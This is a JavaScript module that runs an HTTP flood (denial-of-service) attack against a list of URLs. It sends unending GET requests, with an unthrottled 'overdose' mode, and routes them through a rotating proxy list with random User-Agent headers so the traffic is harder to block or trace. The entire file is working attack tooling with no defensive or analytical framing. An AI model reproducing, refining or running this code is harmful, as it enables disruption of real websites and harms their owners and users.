const request =         require('request');
const fs =              require('fs').promises;
const randomUseragent = require('random-useragent');

module.exports = async ({ urls, overdose, setState }) => {
    let proxyList = (await fs.readFile('proxy.txt', 'utf8')).split('\n');

    setInterval(async () => proxyList = (await fs.readFile('proxy.txt', 'utf8')).split('\n'), 60000);

    const getParams = (url, proxy = false) => {
            const params = {
                url,
                method: 'GET',
                headers: {
                    'User-Agent': randomUseragent.getRandom()
                }
            };
    
            if (proxy) params.proxy = proxy;

            return params;
    }
    
    if (overdose) {
        const attack = (url, proxy) => {
            try {
                request(getParams(url, proxy), (err, res) => {
                    if (err) return setState({ url, success: 'unsuccessfully' });
                    if (res?.statusCode && res?.statusCode < 400) return setState({ url, success: 'successfully' });
                });
            } catch(err) {
                return setState({ url, success: 'unsuccessfully' });
            }
        }

        setInterval(() => {
            for (const url of urls) {
                attack(url);

                if (proxyList?.length) {
                    for (const proxy of proxyList) {
                        attack(url, proxy);
                    }
                }
            }

            return;
        });
    } else {
        const attack = (url, proxy) => {
            try {
                return new Promise((resolve) => {
                    request(getParams(url, proxy), (err, res) => {
                        if (err) setState({ url, success: 'unsuccessfully' });
                        if (res?.statusCode && res?.statusCode < 400) setState({ url, success: 'successfully' });
                        resolve();
                    });
                })
            } catch(err) {
                return setState({ url, success: 'unsuccessfully' });
            }
        }

        while (true) {
            for (const url of urls) {
                await attack(url);

                if (proxyList?.length) {
                    for (const proxy of proxyList) {
                        await attack(url, proxy);
                    }
                }
            }
        }
    }
};

